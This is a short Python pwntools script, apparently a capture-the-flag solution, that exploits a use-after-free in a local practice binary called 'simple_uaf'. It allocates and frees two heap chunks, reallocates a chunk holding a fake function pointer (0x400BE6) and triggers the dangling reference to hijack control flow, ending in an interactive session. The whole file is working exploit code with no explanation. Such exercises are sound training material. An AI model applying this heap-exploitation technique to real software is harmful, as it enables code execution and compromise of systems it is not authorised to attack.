from pwn import *

# context.log_level = "DEBUG"
context.arch = "amd64"

e = ELF("./simple_uaf")
p = process("./simple_uaf")

def use(size, content):
    p.sendlineafter("> ", "001")
    p.sendlineafter(": ", str(size).rjust(7, "0"))
    p.sendlineafter(": ", content)

def free(index):
    p.sendlineafter("> ", "002")
    p.sendlineafter("? ", str(index).rjust(3, "0"))

def after(index):
    p.sendlineafter("> ", "003")
    p.sendlineafter("? ", str(index).rjust(3, "0"))

use(32, "A"*31)
use(32, "A"*31)

free(1)
free(0)

use(16, flat(0x400BE6, 0, 0))

after(1)

p.interactive()